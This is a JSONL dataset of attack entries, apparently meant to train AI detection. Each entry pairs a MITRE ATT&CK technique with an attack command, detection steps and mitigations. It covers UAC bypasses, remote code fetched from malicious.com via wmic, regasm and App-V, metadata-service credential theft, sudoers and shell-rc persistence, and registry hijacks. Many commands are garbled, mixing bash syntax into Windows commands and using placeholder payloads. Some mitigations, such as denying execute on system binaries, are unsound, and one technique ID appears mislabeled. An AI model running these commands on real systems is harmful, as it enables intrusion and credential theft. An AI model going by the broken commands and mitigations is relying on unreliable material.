{"id":79,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse atbroker.exe for accessibility feature execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process atbroker.exe -ArgumentList '/start $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))'\"","detection":"Monitor atbroker: `wmic process where name='atbroker.exe' get commandline`; Event ID 4688.","mitigation":"Restrict atbroker: `icacls %windir%\\System32\\atbroker.exe /deny Everyone:RX`; Disable accessibility features: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoAccessibility /t REG_DWORD /d 1`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect atbroker abuse and suggest access restrictions."}
{"id":80,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Using trap command in Linux shell for persistence.","command":"echo 'trap \"bash -c \\\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\" INT' >> ~/.bashrc","detection":"Monitor trap commands: `cat ~/.bashrc | grep trap`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor trap configurations.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect trap command tampering and suggest file protections."}
{"id":81,"tactic":"Privilege Escalation","technique":"T1548.002: Bypass User Account Control","threat":"Bypassing UAC using sdclt.exe for elevated execution.","command":"sdclt /kickoffelev && powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; I$(echo 'malicious' | base64 -w0)\"","detection":"Monitor sdclt: `wmic process where name='sdclt.exe' get commandline`; Event ID 4688.","mitigation":"Enable UAC: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1`; Restrict sdclt: AppLocker.","references":["MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect UAC bypass via sdclt and suggest UAC enforcement."}
{"id":82,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc.exe to execute malicious MSC file.","command":"mmc $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc)","detection":"Monitor mmc: `wmic process where name='mmc.exe' get commandline`; Event ID 4688.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Disable MSC execution: AppLocker.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc MSC execution and suggest AppLocker policies."}
{"id":83,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using wmic to execute XSL script for code execution.","command":"wmic process call create \"wmic os get /format:http://malicious.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).xsl\"","detection":"Monitor wmic XSL: `wmic process where name='wmic.exe' get commandline | findstr xsl`; Event ID 4688.","mitigation":"Block wmic network access: `netsh advfirewall firewall add rule name='Block WMIC' dir=out program='%windir%\\System32\\wbem\\wmic.exe' action=block`; Disable XSL execution: AppLocker.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wmic XSL execution and suggest firewall rules."}
{"id":84,"tactic":"Persistence","technique":"T1546.006: LC_LOAD_DYLIB Addition","threat":"Injecting malicious dylib on macOS for persistence.","command":"install_name_tool -add_rpath /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib /usr/bin/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor dylib changes: `otool -L /usr/bin/*`; Audit file changes: `auditctl -w /usr/bin -p wa`.","mitigation":"Restrict dylib modifications: `chmod 755 /usr/bin/*`; Enable SIP: `csrutil enable`.","references":["MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect dylib injections and suggest SIP enforcement."}
{"id":85,"tactic":"Credential Access","technique":"T1552.006: Group Policy Preferences","threat":"Extracting credentials from GPP XML files using PowerShell.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-ChildItem \\\\domain\\sysvol\\*.xml | Select-String cpassword\"","detection":"Monitor GPP access: `net use | findstr sysvol`; Audit file access: Event ID 4663.","mitigation":"Remove GPP credentials: `gpedit.msc`; Restrict sysvol access: `icacls \\\\domain\\sysvol /deny Everyone:RX`.","references":["MITRE ATT&CK T1552.006: https://attack.mitre.org/techniques/T1552/006/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect GPP credential extraction and suggest sysvol protections."}
{"id":86,"tactic":"Defense Evasion","technique":"T1218.013: Mavinject","threat":"Using mavinject.exe to inject malicious DLL into process.","command":"mavinject $(tasklist | findstr /i notepad | awk '{print $2}') /INJECTRUNNING $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor mavinject: `wmic process where name='mavinject.exe' get commandline`; Event ID 4688.","mitigation":"Restrict mavinject: `icacls %windir%\\System32\\mavinject.exe /deny Everyone:RX`; Monitor process injections: Sysmon Event ID 10.","references":["MITRE ATT&CK T1218.013: https://attack.mitre.org/techniques/T1218/013/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mavinject DLL injection and suggest access controls."}
{"id":87,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse pcalua.exe for program compatibility execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process pcalua.exe -ArgumentList '-a $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)'\"","detection":"Monitor pcalua: `wmic process where name='pcalua.exe' get commandline`; Event ID 4688.","mitigation":"Restrict pcalua: `icacls %windir%\\System32\\pcalua.exe /deny Everyone:RX`; Disable compatibility assistant: `reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\AppCompat /v DisablePCA /t REG_DWORD /d 1`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect pcalua abuse and suggest compatibility restrictions."}
{"id":88,"tactic":"Persistence","technique":"T1546.001: Change Default File Association","threat":"Changing file association to execute malicious program.","command":"assoc .txt=$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor file associations: `assoc | findstr evil`; Event ID 4657.","mitigation":"Restrict assoc changes: `regini -h deny HKCR`; Audit registry changes: Event ID 4657.","references":["MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect file association changes and suggest registry protections."}
{"id":89,"tactic":"Privilege Escalation","technique":"T1547.008: LSASS Driver","threat":"Registering malicious LSASS driver for privilege escalation.","command":"sc create $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) binpath= \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sys)\" type= kernel","detection":"Monitor LSASS driver: `sc query | findstr kernel`; Event ID 7045.","mitigation":"Restrict driver creation: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Require signed drivers: `bcdedit /set testsigning off`.","references":["MITRE ATT&CK T1547.008: https://attack.mitre.org/techniques/T1547/008/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect LSASS driver registrations and suggest driver signing."}
{"id":90,"tactic":"Defense Evasion","technique":"T1218.006: Mmc","threat":"Using mmc.exe to execute malicious snap-in.","command":"mmc /s $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc)","detection":"Monitor mmc snap-ins: `wmic process where name='mmc.exe' get commandline | findstr msc`; Event ID 4688.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Disable snap-in execution: AppLocker.","references":["MITRE ATT&CK T1218.006: https://attack.mitre.org/techniques/T1218/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc snap-in execution and suggest AppLocker policies."}
{"id":91,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using wmic to execute malicious MOF file.","command":"mofcomp $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).mof)","detection":"Monitor mofcomp: `wmic process where name='mofcomp.exe' get commandline`; Event ID 4688.","mitigation":"Restrict mofcomp: `icacls %windir%\\System32\\wbem\\mofcomp.exe /deny Everyone:RX`; Monitor MOF compilation.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mofcomp MOF execution and suggest access controls."}
{"id":92,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Injecting malicious debugger into IFEO for specific process.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe\" /v Debugger /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)\"","detection":"Monitor IFEO changes: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe\"`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Enable registry auditing.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect IFEO debugger injections for cmd.exe and suggest registry protections."}
{"id":93,"tactic":"Credential Access","technique":"T1552.005: Cloud Instance Metadata API","threat":"Accessing cloud instance metadata to steal credentials.","command":"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)","detection":"Monitor metadata access: `tcpdump -i eth0 host 169.254.169.254`; Audit cloud logs: AWS CloudTrail.","mitigation":"Restrict metadata access: `aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required`; Enable IMDSv2.","references":["MITRE ATT&CK T1552.005: https://attack.mitre.org/techniques/T1552/005/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect cloud metadata access and suggest IMDSv2 enforcement."}
{"id":94,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious JavaScript via url.dll.","command":"rundll32 url.dll,OpenURL \"javascript:evil($(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\"","detection":"Monitor rundll32 JavaScript: `wmic process where name='rundll32.exe' get commandline | findstr javascript`; YARA rule: `rule Rundll32JS { strings: $a = /rundll32.*javascript/ nocase; condition: $a }`","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Disable JavaScript execution: AppLocker.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 JavaScript execution and suggest AppLocker policies."}
{"id":95,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse syncappvpublishing.exe for remote execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process syncappvpublishing.exe -ArgumentList '/q http://malicious.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)'\"","detection":"Monitor syncappvpublishing: `wmic process where name='syncappvpublishing.exe' get commandline`; Event ID 4688.","mitigation":"Restrict syncappvpublishing: `icacls %windir%\\System32\\syncappvpublishing.exe /deny Everyone:RX`; Disable App-V: `reg add HKLM\\Software\\Microsoft\\AppV /v Enabled /t REG_DWORD /d 0`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect syncappvpublishing abuse and suggest App-V restrictions."}
{"id":96,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object for persistence via HKLM registry.","command":"reg add \"HKLM\\Software\\Classes\\CLSID\\{$(uuidgen)}\\InprocServer32\" /ve /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor COM registry: `reg query HKLM\\Software\\Classes\\CLSID /s | findstr InprocServer32`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKLM\\Software\\Classes\\CLSID`; Enable COM auditing.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect COM hijacking in HKLM and suggest registry protections."}
{"id":97,"tactic":"Privilege Escalation","technique":"T1548.003: Sudo and Sudo Caching","threat":"Abusing sudoers file misconfiguration on Linux for privilege escalation.","command":"echo \"$(whoami) ALL=(ALL) NOPASSWD: /bin/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\" >> /etc/sudoers.d/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor sudoers changes: `cat /etc/sudoers.d/*`; Audit file changes: `auditctl -w /etc/sudoers.d -p wa`.","mitigation":"Restrict sudoers writes: `chmod 440 /etc/sudoers.d/*`; Validate sudoers: `visudo -c`.","references":["MITRE ATT&CK T1548.003: https://attack.mitre.org/techniques/T1548/003/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect sudoers misconfigurations and suggest file protections."}
{"id":98,"tactic":"Defense Evasion","technique":"T1218.009: Regasm","threat":"Using regasm.exe to execute malicious assembly from remote server.","command":"regasm /codebase http://malicious.com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor regasm network activity: `netstat -anp | grep regasm`; YARA rule: `rule RegasmRemote { strings: $a = /regasm.*http/ nocase; condition: $a }`","mitigation":"Block regasm network access: `netsh advfirewall firewall add rule name='Block regasm' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe' action=block`; Use AppLocker for assemblies.","references":["MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regasm remote execution and suggest firewall rules."}
{"id":99,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using wmic to execute malicious WMI query for registry-based code execution.","command":"wmic /NAMESPACE:\\\\root\\default PATH StdRegProv CALL SetStringValue hDefKey=2147483650 sSubKeyName=\"Software\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)\" sValueName=\"$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)\" sValue=\"$(echo 'powershell -c I$(echo malicious | base64 -w0)' | base64 -w0)\"","detection":"Monitor wmic WMI queries: `wmic process where name='wmic.exe' get commandline | findstr StdRegProv`; Event ID 4688.","mitigation":"Restrict wmic: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Disable WMI remote access: `netsh advfirewall firewall add rule name='Block WMI' dir=out action=block service=winmgmt`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wmic WMI registry manipulation and suggest access controls."}
{"id":100,"tactic":"Persistence","technique":"T1546.003: Windows Management Instrumentation Event Subscription","threat":"Creating WMI event subscription to execute payload on process creation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \\\"Win32_Process\\\" AND TargetInstance.Name=\\\"notepad.exe\\\"' -Action { I$(echo 'malicious' | base64 -w0) } -Name $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)\"","detection":"Monitor WMI subscriptions: `Get-WmiObject -Namespace root\\subscription -Class __EventConsumer | Select-Object Name`; Event ID 5861.","mitigation":"Restrict WMI subscriptions: `netsh advfirewall firewall add rule name='Block WMI' dir=in action=block service=winmgmt`; Audit WMI events: `wevtutil qe Microsoft-Windows-WMI-Activity/Operational`.","references":["MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect WMI event subscriptions for persistence and suggest firewall rules."}
{"id":101,"tactic":"Privilege Escalation","technique":"T1134.001: Token Impersonation/Theft","threat":"Stealing Kerberos ticket using klist for privilege escalation.","command":"klist get krbtgt -c $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo ticket$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor klist: `wmic process where name='klist.exe' get commandline | findstr krbtgt`; Audit Kerberos events: Event ID 4768.","mitigation":"Restrict klist: `icacls %windir%\\System32\\klist.exe /deny Everyone:RX`; Enable Kerberos auditing: `auditpol /set /subcategory:'Kerberos Authentication Service' /success:enable`.","references":["MITRE ATT&CK T1134.001: https://attack.mitre.org/techniques/T1134/001/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect Kerberos ticket theft and suggest auditing configurations."}
{"id":102,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute malicious DLL via COM interface.","command":"regsvr32 /s /i:COM $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor regsvr32 COM: `wmic process where name='regsvr32.exe' get commandline | findstr COM`; YARA rule: `rule Regsvr32COM { strings: $a = /regsvr32.*COM/ nocase; condition: $a }`","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Use AppLocker to block unsigned DLLs.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 COM execution and suggest AppLocker policies."}
{"id":103,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse wbadmin for malicious backup script execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; wbadmin START BACKUP -backupTarget:C: -include:C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ps1) -quiet\"","detection":"Monitor wbadmin: `wmic process where name='wbadmin.exe' get commandline`; Event ID 4688.","mitigation":"Restrict wbadmin: `icacls %windir%\\System32\\wbadmin.exe /deny Everyone:RX`; Audit backup operations: Event ID 8220.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wbadmin abuse and suggest access restrictions."}
{"id":104,"tactic":"Persistence","technique":"T1547.009: Shortcut Modification","threat":"Modifying RDP shortcut to execute malicious payload.","command":"copy %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Remote Desktop Connection.lnk %temp%\\$(echo rdp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).lnk) && reg add HKCU\\Software\\Microsoft\\Terminal Server Client /v Default /t REG_SZ /d \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor shortcut changes: `dir %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\*.lnk /a`; Event ID 4657.","mitigation":"Restrict shortcut writes: `icacls %appdata%\\Microsoft\\Windows\\Start Menu\\Programs /deny Everyone:WX`; Audit RDP configurations.","references":["MITRE ATT&CK T1547.009: https://attack.mitre.org/techniques/T1547/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect RDP shortcut modifications and suggest access controls."}
{"id":105,"tactic":"Credential Access","technique":"T1552.001: Credentials in Files","threat":"Extracting credentials from unattended.xml using findstr.","command":"findstr /s /i sysprep %windir%\\Panther\\unattend*.xml > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor findstr: `wmic process where name='findstr.exe' get commandline | findstr unattend`; Event ID 4663.","mitigation":"Secure unattend files: `icacls %windir%\\Panther /deny Everyone:RX`; Remove credentials: `del %windir%\\Panther\\unattend*.xml`.","references":["MITRE ATT&CK T1552.001: https://attack.mitre.org/techniques/T1552/001/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect unattend.xml credential extraction and suggest file protections."}
{"id":106,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute obfuscated VBScript payload.","command":"mshta vbscript:Execute(\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) = CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell -c I$(echo malicious | base64 -w0)\\\"):window.close\")(window.close)","detection":"Monitor mshta VBScript: `wmic process where name='mshta.exe' get commandline | findstr vbscript`; YARA rule: `rule MshtaVBS { strings: $a = /mshta.*vbscript.*Execute/ nocase; condition: $a }`","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Disable VBScript execution: AppLocker.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta VBScript execution and suggest AppLocker policies."}
{"id":107,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using sc.exe to create malicious service for code execution.","command":"sc create $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) binpath= \"cmd /c powershell -c 'I$(echo malicious | base64 -w0)'\" start= auto","detection":"Monitor sc.exe: `wmic process where name='sc.exe' get commandline | findstr create`; Event ID 7045.","mitigation":"Restrict sc.exe: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Audit service creation: Event ID 7045.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect malicious service creation via sc.exe and suggest access controls."}
{"id":108,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Injecting malicious alias into zshrc for persistence on Linux.","command":"echo 'alias ls=\"bash -c \\\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\"' >> ~/.zshrc","detection":"Monitor zshrc changes: `cat ~/.zshrc | grep alias`; Audit file changes: `auditctl -w ~/.zshrc -p wa`.","mitigation":"Restrict zshrc writes: `chmod 600 ~/.zshrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect zshrc alias tampering and suggest file protections."}
{"id":109,"tactic":"Privilege Escalation","technique":"T1548.002: Bypass User Account Control","threat":"Bypassing UAC using fodhelper.exe for elevated execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process fodhelper.exe -NoNewWindow; Start-Sleep 1; I$(echo 'malicious' | base64 -w0)\"","detection":"Monitor fodhelper: `wmic process where name='fodhelper.exe' get commandline`; Event ID 4688.","mitigation":"Enable UAC: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1`; Restrict fodhelper: `icacls %windir%\\System32\\fodhelper.exe /deny Everyone:RX`.","references":["MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect UAC bypass via fodhelper and suggest UAC enforcement."}
{"id":110,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via shell32.dll.","command":"rundll32 shell32.dll,ShellExec_RunDLL \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor rundll32 shell32: `wmic process where name='rundll32.exe' get commandline | findstr shell32`; YARA rule: `rule Rundll32Shell { strings: $a = /rundll32.*shell32.*ShellExec/ nocase; condition: $a }`","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Use AppLocker to block shell32 execution.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shell32 execution and suggest AppLocker policies."}
{"id":111,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse gcloud CLI for unauthorized GCP access.","command":"python -c \"import os; os.system('gcloud compute instances list --filter=\\\"name:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\\" --format=\\\"value(name)\\\" | xargs -I {} gcloud compute ssh {} --command=\\\"bash -c \\\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\"')\"","detection":"Monitor gcloud CLI: `wmic process where name='python.exe' get commandline | findstr gcloud`; Audit GCP logs: Cloud Audit Logs.","mitigation":"Restrict gcloud CLI: `icacls %userprofile%\\.config\\gcloud /deny Everyone:RX`; Require MFA: GCP IAM policies.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect unauthorized gcloud CLI execution and suggest MFA enforcement."}
{"id":112,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing magnify.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\magnify.exe","detection":"Monitor magnify.exe changes: `dir %windir%\\System32\\magnify.exe /a`; Event ID 4657.","mitigation":"Restrict magnify.exe: `icacls %windir%\\System32\\magnify.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect magnify.exe tampering and suggest file protections."}
{"id":113,"tactic":"Credential Access","technique":"T1555.004: Windows Credential Manager","threat":"Extracting credentials from Windows Credential Manager using cmdkey.","command":"cmdkey /list | findstr Target > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor cmdkey: `wmic process where name='cmdkey.exe' get commandline | findstr list`; Event ID 4688.","mitigation":"Restrict cmdkey: `icacls %windir%\\System32\\cmdkey.exe /deny Everyone:RX`; Enable Credential Guard: `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags /t REG_DWORD /d 2`.","references":["MITRE ATT&CK T1555.004: https://attack.mitre.org/techniques/T1555/004/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect cmdkey credential extraction and suggest Credential Guard."}
{"id":114,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to execute malicious MSI with elevated privileges.","command":"msiexec /quiet /i $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) ALLUSERS=1","detection":"Monitor msiexec: `wmic process where name='msiexec.exe' get commandline | findstr ALLUSERS`; Event ID 4688.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Use AppLocker to block unsigned MSIs.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec MSI execution and suggest AppLocker policies."}
{"id":115,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using bcdedit to execute malicious boot configuration payload.","command":"bcdedit /set {current} recoveryenabled Yes && bcdedit /set {current} recoverysequence {$(uuidgen)} && bcdedit /set {$(uuidgen)} application osloader path \\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor bcdedit: `wmic process where name='bcdedit.exe' get commandline | findstr recovery`; Event ID 4688.","mitigation":"Restrict bcdedit: `icacls %windir%\\System32\\bcdedit.exe /deny Everyone:RX`; Audit boot changes: Event ID 4657.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect bcdedit boot manipulation and suggest access controls."}
